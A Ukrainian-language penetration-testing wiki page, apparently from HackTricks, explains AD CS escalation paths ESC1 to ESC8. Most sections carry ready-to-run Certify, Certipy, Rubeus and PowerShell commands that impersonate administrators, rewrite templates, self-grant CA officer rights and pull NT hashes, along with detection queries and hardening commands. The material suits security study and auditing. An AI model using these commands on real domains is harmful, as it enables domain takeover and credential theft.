# Ескалація в домені AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Це короткий виклад розділів про техніки ескалації з дописів:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів — ESC1

### Пояснення

### Пояснення ESC1: неправильно налаштовані шаблони сертифікатів

- **Enterprise CA надає користувачам із низькими привілеями права на реєстрацію.**
- **Схвалення керівника не потрібне.**
- **Підписи уповноважених співробітників не потрібні.**
- **Дескриптори безпеки шаблонів сертифікатів мають надмірно широкі дозволи, що дає користувачам із низькими привілеями змогу отримати права на реєстрацію.**
- **Шаблони сертифікатів налаштовано на визначення EKU, які дають змогу автентифікуватися:**
  - До них належать ідентифікатори Extended Key Usage (EKU), як-от Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) або відсутність EKU (SubCA).
- **Шаблон дозволяє запитувачам додавати subjectAltName до Certificate Signing Request (CSR):**
  - Active Directory (AD) надає перевагу subjectAltName (SAN) у сертифікаті для перевірки особи, якщо він присутній. Це означає, що, вказавши SAN у CSR, можна запросити сертифікат для видавання себе за будь-якого користувача (наприклад, адміністратора домену). Можливість запитувача вказати SAN визначається властивістю `mspki-certificate-name-flag` об’єкта шаблону сертифіката в AD. Ця властивість є бітовою маскою, і наявність прапорця `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказати SAN.

> [!CAUTION]
> Ці параметри дають змогу визначити кандидатний шаблон ESC1, але самі по собі не підтверджують наявність шляху для видавання себе за іншу особу. Перевірте, чи може цільовий принципал зареєструватися в CA, що публікує шаблон, чи дозволена реєстрація в CA та чи відповідає виданий сертифікат правилам надійного зіставлення SID на кінцевій точці автентифікації. Актуальні KDC із встановленими виправленнями можуть відхилити запитаний UPN, якщо SID сертифіката не відповідає SID цільового облікового запису; див. [рекомендації Microsoft щодо зіставлення сертифікатів](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Права на реєстрацію, надані **Domain Computers**, можуть дозволити зареєструвати попередньо створений обліковий запис комп’ютера, навіть якщо початковий користувач не має такої можливості. Перевіряйте права облікового запису комп’ютера окремо. Перш ніж надсилати запит, перевірте `msPKI-Minimal-Key-Size`: шаблон, який вимагає ключі RSA довжиною 4096 біт, відхилить стандартний ключ клієнта довжиною 2048 біт. SID цільового облікового запису, указаний у запиті, може допомогти усунути невідповідність SID лише за умови, що CA і KDC приймають отриманий сертифікат і його зіставлення; самі лише прапорці шаблону або ACE з правом Enroll цього не підтверджують.

Цю функцію іноді вмикають для підтримки динамічного створення HTTPS-сертифікатів або сертифікатів вузлів продуктами чи службами розгортання або через брак розуміння.

Зазначається, що створення сертифіката з цією опцією викликає попередження. Такого попередження не буде, якщо продублювати наявний шаблон сертифіката (наприклад, шаблон `WebServer`, у якому ввімкнено `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`), а потім змінити його, додавши OID для автентифікації.<sup>[[6]](#references)</sup>

### Експлуатація

Щоб **знайти вразливі шаблони сертифікатів**, можна виконати:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Щоб **скористатися цією вразливістю та видати себе за адміністратора**, можна виконати:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Потім можна перетворити згенерований **сертифікат у формат `.pfx`** і знову **автентифікуватися за допомогою Rubeus або certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Бінарні файли Windows «Certreq.exe» і «Certutil.exe» можна використати для створення PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перелік шаблонів сертифікатів у схемі конфігурації AD Forest, зокрема тих, що не потребують схвалення чи підписів, мають EKU Client Authentication або Smart Card Logon і для яких увімкнено прапорець `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна отримати, виконавши такий LDAP-запит:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Неправильно налаштовані шаблони сертифікатів — ESC2

### Пояснення

Другий сценарій зловживання є варіантом першого:

1. Enterprise CA надає користувачам із низькими привілеями права на реєстрацію.
2. Вимогу щодо схвалення керівника вимкнено.
3. Вимогу щодо авторизованих підписів скасовано.
4. Надто дозвільний дескриптор безпеки шаблону сертифіката надає користувачам із низькими привілеями права на реєстрацію сертифікатів.
5. **У шаблоні сертифіката визначено EKU Any Purpose або не визначено жодного EKU.**

**EKU Any Purpose** дає змогу зловмиснику отримати сертифікат **для будь-якої мети**, зокрема для автентифікації клієнта, автентифікації сервера, підпису коду тощо. Для експлуатації цього сценарію можна застосувати ту саму **техніку, що й для ESC3**.

Сертифікати **без EKU**, які діють як сертифікати підпорядкованого CA, можна використати **для будь-якої мети**, а також **для підпису нових сертифікатів**. Отже, зловмисник може вказати довільні EKU або поля в нових сертифікатах, використавши сертифікат підпорядкованого CA.

Однак нові сертифікати, створені для **автентифікації в домені**, не працюватимуть, якщо підпорядкований CA не є довіреним для об’єкта **`NTAuthCertificates`**, що є типовим налаштуванням. Проте зловмисник усе ще може створювати **нові сертифікати з будь-яким EKU** та довільними значеннями сертифіката. Їх потенційно можна **використати для зловживань** із різними цілями (наприклад, підпису коду, автентифікації сервера тощо), що може мати значні наслідки для інших програм у мережі, як-от SAML, AD FS або IPSec.<sup>[[6]](#references)</sup>

Щоб перелічити шаблони, які відповідають цьому сценарію в схемі конфігурації лісу AD, можна виконати такий LDAP-запит:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Неправильно налаштовані шаблони Enrollment Agent — ESC3

### Пояснення

Цей сценарій схожий на перший і другий, але **зловживає** іншим **EKU** (Certificate Request Agent) і використовує **2 різні шаблони** (тому має 2 набори вимог),

**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), відомий у документації Microsoft як **Enrollment Agent**, дає суб’єкту змогу **отримати** **сертифікат** **від імені іншого користувача**.

**«Enrollment agent»** отримує сертифікат за таким **шаблоном** і використовує його, щоб **підписати CSR разом з іншим користувачем від його імені**. Потім він **надсилає** **спільно підписаний CSR** до CA, щоб отримати сертифікат за **шаблоном**, який **дозволяє «отримання від імені іншого користувача»**, а CA видає **сертифікат, що належить «іншому» користувачу**.<sup>[[6]](#references)</sup>

**Вимоги 1:**

- Enterprise CA надає користувачам із низькими привілеями право на отримання сертифікатів.
- Вимогу щодо схвалення менеджером не встановлено.
- Вимога щодо авторизованих підписів відсутня.
- Дескриптор безпеки шаблону сертифіката надмірно дозвільний і надає користувачам із низькими привілеями право на отримання сертифікатів.
- Шаблон сертифіката містить EKU Certificate Request Agent, що дає змогу запитувати сертифікати за іншими шаблонами від імені інших суб’єктів.

**Вимоги 2:**

- Enterprise CA надає користувачам із низькими привілеями право на отримання сертифікатів.
- Схвалення менеджером можна обійти.
- Шаблон версії 1 може приймати Enrollment Agent без новіших детальних елементів керування політиками видачі; для версії 2 або новішої перевірте вимоги до видачі application-policy та авторизовані підписи, а не виключайте шаблон лише через його версію.
- EKU, визначений у шаблоні сертифіката, дозволяє автентифікацію в домені.
- Обмеження для Enrollment Agent не застосовуються на CA.

Цільовий шаблон також має бути опублікований вибраним CA, дозволяти цільовому обліковому запису отримувати сертифікат і підтримувати передбачене використання для автентифікації в домені. Перевірте обов’язкові атрибути subject/SAN для цього облікового запису; наприклад, шаблон, який формує subject на основі адреси електронної пошти з AD, не може видати сертифікат для облікового запису без необхідного значення `mail`. Самого сертифіката агента недостатньо, щоб виконати ці вимоги цільового шаблону.

### Експлуатація

Для експлуатації цього сценарію можна скористатися [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy):<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Користувачів**, яким дозволено **отримати** **сертифікат агента реєстрації**, шаблони, у яких агентам реєстрації дозволено надсилати запити на сертифікати, і **облікові записи**, від імені яких агент реєстрації може діяти, можна обмежити за допомогою корпоративних CA. Для цього відкрийте оснастку `certsrc.msc`, **клацніть правою кнопкою миші CA**, **клацніть Properties**, а потім **перейдіть** на вкладку «Enrollment Agents».

Однак зауважте, що **стандартне** налаштування CA — «**Do not restrict enrollment agents**». Коли адміністратори вмикають обмеження для агентів реєстрації, вибираючи «Restrict enrollment agents», стандартна конфігурація залишається надзвичайно дозвільною. Вона дає змогу **Everyone** надсилати запити на сертифікати для всіх шаблонів від імені будь-кого.

### Windows-only PowerShell PoCs with Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) використовує ESC1 і ESC2/ESC3 без Certify або Certipy. Його скрипти створюють експортований ключ RSA довжиною 2048 біт за допомогою COM API `X509Enrollment`, формують запит PKCS#10, знаходять перший `pKIEnrollmentService` через LDAP, надсилають запит за допомогою `CertificateAuthority.Request`, установлюють відповідь у `Cert:\CurrentUser\My` і експортують PFX у кодуванні Base64. Скрипт ESC1 додає вибраний атакувальником UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, значення `0xb`), тоді як скрипти ESC2/ESC3 використовують перший сертифікат для підписання запиту PKCS#7 від імені іншого користувача.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Скрипти виводять Base64 для **PFX**, який містить приватний ключ, щоб його можна було безпосередньо використовувати з Rubeus. Не замінюйте його на `[Convert]::ToBase64String($cert.RawData)`: `RawData` кодує лише публічний сертифікат і не може підписати запит PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Уразливий контроль доступу до шаблону сертифіката — ESC4

### **Пояснення**

**Дескриптор безпеки** для **шаблонів сертифікатів** визначає **дозволи**, які мають певні **принципали AD** щодо шаблону.

Якщо **атакувальник** має необхідні **дозволи**, щоб **змінити** **шаблон** і **впровадити** будь-які **експлуатовані неправильні конфігурації**, описані в **попередніх розділах**, це може сприяти підвищенню привілеїв.

До важливих дозволів, що застосовуються до шаблонів сертифікатів, належать:<sup>[[6]](#references)</sup>

- **Owner:** Надає неявний контроль над об’єктом, даючи змогу змінювати будь-які атрибути.
- **FullControl:** Надає повні повноваження щодо об’єкта, зокрема можливість змінювати будь-які атрибути.
- **WriteOwner:** Дозволяє змінити власника об’єкта на принципала, контрольованого атакувальником.
- **WriteDacl:** Дозволяє змінювати елементи керування доступом, потенційно надаючи атакувальнику FullControl.
- **WriteProperty:** Дозволяє редагувати будь-які властивості об’єкта.

Також перевірте DACL контейнера `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Відповідний ACE `CreateChild`, застосовний до класу [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), або широкі права повного контролю можуть дозволити створити новий об’єкт шаблону. [Документація Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) вказує, що цей контейнер містить такі об’єкти шаблонів. Перш ніж визначати, чи буде створення можливим, перевірте відповідні заборонні ACE та успадкування. Саме по собі створення шаблону не призводить до видачі сертифіката: CA має опублікувати його, запитувач повинен мати дозвіл на реєстрацію, а сертифікат має зіставлятися з потрібним ідентифікатором на кінцевій точці автентифікації.

### Зловживання

Щоб виявити принципалів із правами редагування шаблонів та інших об’єктів PKI, виконайте перерахування за допомогою Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

An example of a privesc, як і в попередньому випадку:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 — це ситуація, коли користувач має права на запис до шаблону сертифіката. Наприклад, цим можна скористатися, щоб перезаписати конфігурацію шаблону сертифіката й зробити його вразливим до ESC1.

Шаблон, який уже дозволяє заявнику вказувати суб’єкта, але має лише призначення Server Authentication, сам по собі не є шаблоном для входу користувача. Маючи ефективні права керування шаблоном, зловмисник може змінити його EKU автентифікації або політики застосунків перед запитом сертифіката; [Microsoft описує призначення EKU Smartcard Logon для входу](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Переконайтеся, що CA публікує змінений шаблон, заявник може отримати сертифікат, вимоги щодо схвалення/підпису виконано, а виданий сертифікат зіставляється з потрібним обліковим записом. Зокрема, [контролери домену з установленими оновленнями, що працюють у режимі Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers), відхиляють сертифікати без надійного зіставлення; додавання UPN цільового облікового запису до запиту не обходить цю вимогу.

Як бачимо на наведеному вище шляху, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` отримав нове ребро `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов’язана із сертифікатами, я також реалізував цю атаку, відому як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ось невеликий попередній огляд команди Certipy `shadow auto`, яка отримує NT hash жертви.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. **За замовчуванням** Certipy **перезаписує** конфігурацію, щоб зробити шаблон **вразливим до ESC1**. Також можна вказати параметр **`-save-old`, щоб зберегти стару конфігурацію**. Це стане в пригоді для **відновлення** конфігурації після атаки.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Контроль доступу до вразливих об’єктів PKI - ESC5

### Пояснення

Розгалужена мережа взаємопов’язаних ACL-зв’язків, до якої входить низка об’єктів, крім шаблонів сертифікатів і центру сертифікації, може вплинути на безпеку всієї системи AD CS. До цих об’єктів, які можуть істотно впливати на безпеку, належать:

- Об’єкт комп’ютера AD сервера CA, який можна скомпрометувати за допомогою таких механізмів, як S4U2Self або S4U2Proxy.
- RPC/DCOM-сервер сервера CA.
- Будь-який дочірній об’єкт AD або контейнер у межах певного шляху контейнера `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях включає, зокрема, контейнер Certificate Templates, контейнер Certification Authorities, об’єкт NTAuthCertificates і контейнер Enrollment Services.

Безпеку системи PKI можна скомпрометувати, якщо зловмиснику з низькими привілеями вдасться отримати контроль над будь-яким із цих критично важливих компонентів.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

У дописі [**CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) також розглядаються наслідки прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, як це описано в Microsoft. Якщо цю конфігурацію активовано на Certification Authority (CA), вона дає змогу додавати **значення, визначені користувачем**, до **альтернативного імені суб’єкта** для **будь-якого запиту**, зокрема сформованого на основі Active Directory®. У результаті зловмисник може отримати сертифікат за допомогою **будь-якого шаблону**, налаштованого для **автентифікації** домену, зокрема тих, що дають змогу **непривілейованим** користувачам отримувати сертифікати, як-от стандартний шаблон User. Таким чином можна отримати сертифікат, який дасть зловмиснику змогу автентифікуватися як адміністратор домену або **будь-який інший активний обліковий запис** у домені.<sup>[[9]](#references)</sup>

**Примітка**: Спосіб додавання **альтернативних імен** до Certificate Signing Request (CSR) за допомогою аргументу `-attrib "SAN:"` у `certreq.exe` (так звані «Name Value Pairs») **відрізняється** від стратегії експлуатації SAN у ESC1. Різниця полягає в **тому, як інкапсулюються відомості облікового запису** — в атрибуті сертифіката, а не в розширенні.

### Експлуатація

Щоб перевірити, чи активовано цей параметр, організації можуть скористатися такою командою `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Ця операція по суті використовує **віддалений доступ до реєстру**, тож альтернативний підхід може бути таким:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Інструменти на кшталт [**Certify**](https://github.com/GhostPack/Certify) та [**Certipy**](https://github.com/ly4k/Certipy) здатні виявляти цю неправильну конфігурацію та експлуатувати її:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Щоб змінити ці параметри, за умови наявності **прав адміністратора домену** або еквівалентних прав, можна виконати таку команду з будь-якої робочої станції:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Після встановлення оновлень безпеки за травень 2022 року нові **сертифікати** міститимуть **розширення безпеки**, яке включає властивість `objectSid` **запитувача**. Для ESC1 цей SID визначається на основі вказаного SAN. Однак для **ESC6** SID відповідає `objectSid` **запитувача**, а не SAN.\
> Щоб скористатися ESC6, система має бути вразливою до ESC10 (Weak Certificate Mappings), який надає **SAN** пріоритет над новим розширенням безпеки.

## Керування доступом до вразливого центру сертифікації — ESC7

### Атака 1

#### Пояснення

Керування доступом до центру сертифікації здійснюється за допомогою набору дозволів, які визначають дії центру сертифікації. Переглянути ці дозволи можна, відкривши `certsrv.msc`, клацнувши правою кнопкою миші центр сертифікації, вибравши властивості й перейшовши на вкладку «Безпека». Крім того, дозволи можна перелічити за допомогою модуля PSPKI командами на кшталт:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Це дає змогу краще зрозуміти основні права — **`ManageCA`** і **`ManageCertificates`**, що відповідають ролям «адміністратор CA» і «менеджер сертифікатів» відповідно.<sup>[[6]](#references)</sup>

#### Зловживання

Права **`ManageCA`** на центр сертифікації дають суб’єкту змогу віддалено змінювати його налаштування за допомогою PSPKI. Зокрема, можна ввімкнути прапорець **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, щоб дозволити вказувати SAN у будь-якому шаблоні, що є критично важливим для domain escalation.

Цей процес можна спростити за допомогою командлета PSPKI **Enable-PolicyModuleFlag**, який дає змогу вносити зміни без безпосередньої взаємодії з графічним інтерфейсом.

Права **`ManageCertificates`** дають змогу схвалювати запити, що очікують на розгляд, фактично обходячи захисний механізм «схвалення менеджером сертифікатів CA».

За допомогою модулів **Certify** і **PSPKI** можна надіслати запит на сертифікат, схвалити його та завантажити сертифікат:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Атака 2

#### Пояснення

> [!WARNING]
> У **попередній атаці** дозволи **`Manage CA`** використовувалися, щоб **увімкнути** прапорець **EDITF_ATTRIBUTESUBJECTALTNAME2** для виконання атаки **ESC6**, але це не матиме жодного ефекту, доки службу CA (`CertSvc`) не буде перезапущено. Коли користувач має право доступу `Manage CA`, йому також дозволено **перезапускати службу**. Однак це **не означає, що користувач може перезапустити службу віддалено**. Крім того, **ESC6 може не працювати без додаткових налаштувань** у більшості середовищ із встановленими виправленнями через оновлення безпеки за травень 2022 року.

Тому тут описано іншу атаку.

Передумови:

- Лише дозвіл **`ManageCA`**
- Дозвіл **`Manage Certificates`** (його можна надати через **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** має бути **увімкнений** (його можна ввімкнути через **`ManageCA`**)

Техніка ґрунтується на тому, що користувачі з правами доступу `Manage CA` _і_ `Manage Certificates` можуть **видавати сертифікати за відхиленими запитами**. Шаблон сертифіката **`SubCA`** **вразливий до ESC1**, але зарахуватися на нього можуть **лише адміністратори**. Отже, **користувач** може **подати запит** на зарахування до **`SubCA`** — у цьому йому **відмовлять**, — але **згодом керівник видасть сертифікат**.<sup>[[6]](#references)</sup>

#### Зловживання

Ви можете **надати собі право доступу `Manage Certificates`**, додавши свого користувача як нового офіцера.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Шаблон **`SubCA`** можна **ввімкнути на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон `SubCA` увімкнено.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Якщо ми виконали передумови для цієї атаки, можемо почати з **запиту сертифіката на основі шаблону `SubCA`**.

**У цьому запиті буде відмовлено**, але ми збережемо приватний ключ і занотуємо ID запиту.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Маючи **`Manage CA` і `Manage Certificates`**, ми можемо видати запит на сертифікат, який завершився помилкою, за допомогою команди `ca` та параметра `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` і параметра `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Атака 3 – Зловживання розширенням Manage Certificates (SetExtension)

#### Пояснення

Окрім класичних зловживань ESC7 (увімкнення атрибутів EDITF або схвалення запитів, що очікують на розгляд), **Certify 2.0** виявив абсолютно новий примітив, для використання якого потрібна лише роль *Manage Certificates* (також відома як **Certificate Manager / Officer**) на Enterprise CA.<sup>[[3]](#references)</sup>

RPC-метод `ICertAdmin::SetExtension` може виконати будь-який суб’єкт із правом *Manage Certificates*. Раніше цей метод легітимні CA використовували для оновлення розширень у **запитах, що очікують на розгляд**, але зловмисник може скористатися ним, щоб **додати *нестандартне* розширення сертифіката** (наприклад, користувацький OID *Certificate Issuance Policy*, як-от `1.1.1.1`), до запиту, що очікує на схвалення.

Оскільки цільовий шаблон **не визначає значення за замовчуванням для цього розширення**, CA НЕ перезапише контрольоване зловмисником значення, коли запит зрештою буде видано. Тому отриманий сертифікат міститиме вибране зловмисником розширення, яке може:

* Задовольнити вимоги до Application / Issuance Policy інших вразливих шаблонів (що призведе до ескалації привілеїв).
* Додати EKU або політики, які надають сертифікату неочікуваний рівень довіри в сторонніх системах.

Коротко кажучи, *Manage Certificates* — раніше вважалося «менш потужною» частиною ESC7 — тепер можна використати для повної ескалації привілеїв або довготривалого закріплення в системі, не змінюючи конфігурацію CA й не потребуючи суворішого права *Manage CA*.

#### Зловживання примітивом за допомогою Certify 2.0

1. **Надішліть запит на сертифікат, який залишиться *на розгляді*.** Це можна забезпечити за допомогою шаблону, що вимагає схвалення керівника:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Додайте власне розширення до запиту, що очікує на розгляд**, використовуючи нову команду `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Якщо шаблон уже не визначає розширення *Політики видачі сертифікатів*, наведене вище значення буде збережено після видачі.*

3. **Надішліть запит** (якщо ваша роль також має права на затвердження *Керування сертифікатами*) або дочекайтеся, поки оператор його затвердить. Після видачі завантажте сертифікат:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Отриманий сертифікат тепер містить шкідливий OID політики видачі та може використовуватися в подальших атаках (наприклад, ESC13, підвищення привілеїв у домені тощо).

> NOTE: ту саму атаку можна виконати за допомогою Certipy ≥ 4.7 через команду `ca` та параметр `-set-extension`.

## NTLM Relay до HTTP-кінцевих точок AD CS – ESC8

### Пояснення

> [!TIP]
> У середовищах, де **встановлено AD CS**, якщо існує **вразлива кінцева точка вебреєстрації** та опубліковано принаймні один **шаблон сертифіката**, що дозволяє **реєстрацію комп’ютерів домену та автентифікацію клієнта** (наприклад, стандартний шаблон **`Machine`**), зловмисник може **скомпрометувати будь-який комп’ютер, на якому активна служба spooler**!

AD CS підтримує кілька **методів реєстрації на основі HTTP**, доступних завдяки додатковим ролям сервера, які можуть установлювати адміністратори. Ці інтерфейси реєстрації сертифікатів через HTTP вразливі до **атак NTLM relay**. З **скомпрометованої машини зловмисник може видати себе за будь-який обліковий запис AD, який автентифікується через вхідний NTLM**. Видаючи себе за обліковий запис жертви, зловмисник може отримати доступ до цих вебінтерфейсів і **запросити сертифікат для автентифікації клієнта, використовуючи шаблон сертифіката `User` або `Machine`**.

